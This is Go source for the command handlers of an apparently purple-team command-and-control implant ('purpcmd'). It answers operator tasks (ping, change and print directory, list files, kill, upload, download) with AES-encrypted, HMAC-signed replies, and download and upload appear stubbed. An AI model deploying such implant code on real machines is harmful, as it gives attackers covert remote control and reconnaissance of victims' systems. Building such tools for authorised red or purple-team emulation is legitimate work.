package core

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"purpcmd/implant"
	"purpcmd/internal/encrypt"
	"syscall"
)

// CommandContext holds the common context needed by all command handlers
type CommandContext struct {
	Implant *implant.ImplantMetadata
	Encrypt *encrypt.Encrypt
	HTTP    *Request
}

// HandlePing handles the PING command
func HandlePing(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> PING")
	responseTaskPayload := string(payload) + " pong"
	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)

	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleDownload handles the DOWN command
func HandleDownload(ctx *CommandContext, tid [8]byte) string {
	println("\n-> DOWN")
	taskResp := PackChunk(ctx.Implant, "any.txt", []byte("aaa"), tid)

	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleUpload handles the UPL command
func HandleUpload(ctx *CommandContext, payload []byte, tid [8]byte) string {
	//Step		Size	Offset (bytes)
	//nameLen	2		0
	//name		N		2
	//dataLen	4		2 + N
	//data		M		2 + N + 4
	println("\n-> UPL")
	nameLen := binary.BigEndian.Uint16(payload[:2])
	name := payload[2 : 2+nameLen]

	dataLenStart := 2 + nameLen
	dataLen := binary.BigEndian.Uint32(payload[dataLenStart : dataLenStart+4])

	dataStart := dataLenStart + 4
	data := payload[dataStart : uint32(dataStart)+uint32(dataLen)]

	println("got file name ", name, " with data ", string(data))

	responseTaskPayload := "saved file to " + string(name)
	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)

	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleCD handles the CD (change directory) command
func HandleCD(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> CD")
	dir := string(payload)
	err := os.Chdir(dir)

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = "Failed to change directory: " + err.Error()
	} else {
		cwd, _ := os.Getwd()
		responseTaskPayload = "Changed directory to: " + cwd
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandlePWD handles the PWD (print working directory) command
func HandlePWD(ctx *CommandContext, tid [8]byte) string {
	println("\n-> PWD")
	cwd, err := os.Getwd()

	var responseTaskPayload string
	if err != nil {
		responseTaskPayload = "Failed to get working directory: " + err.Error()
	} else {
		responseTaskPayload = cwd
	}

	taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}

// HandleKill handles the KILL command
func HandleKill() {
	println("\n-> KILL")
	os.Exit(0)
}

// HandleLS handles the LS (list files) command
func HandleLS(ctx *CommandContext, payload []byte, tid [8]byte) string {
	println("\n-> LS")

	// Determine directory to list
	dir := "."
	if len(payload) > 0 {
		dir = string(payload)
	}

	// Read directory entries
	entries, err := os.ReadDir(dir)
	if err != nil {
		responseTaskPayload := "Failed to list directory: " + err.Error()
		taskResp := PackResponse(ctx.Implant, []byte(responseTaskPayload), tid)
		dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
		ctx.Encrypt.HMACPackAddHmac(&dataEnc)
		taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
		println(taskRestEnc)
		return taskRestEnc
	}

	// Build formatted output
	var output string
	output += fmt.Sprintf("Listing directory: %s\n\n", dir)
	output += fmt.Sprintf("%-10s %-8s %-8s %10s  %s\n", "PERMS", "OWNER", "GROUP", "SIZE", "NAME")
	output += "------------------------------------------------------------\n"

	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}

		// Get permissions
		perms := info.Mode().String()

		// Get size
		size := info.Size()

		// Get owner and group (Linux-specific)
		owner := "?"
		group := "?"
		if stat, ok := info.Sys().(*syscall.Stat_t); ok {
			owner = fmt.Sprintf("%d", stat.Uid)
			group = fmt.Sprintf("%d", stat.Gid)
		}

		output += fmt.Sprintf("%-10s %-8s %-8s %10d  %s\n", perms, owner, group, size, entry.Name())
	}

	taskResp := PackResponse(ctx.Implant, []byte(output), tid)
	dataEnc := ctx.Encrypt.AESCbcEncrypt(taskResp)
	ctx.Encrypt.HMACPackAddHmac(&dataEnc)
	taskRestEnc := base64.StdEncoding.EncodeToString(dataEnc)
	println(taskRestEnc)
	return taskRestEnc
}
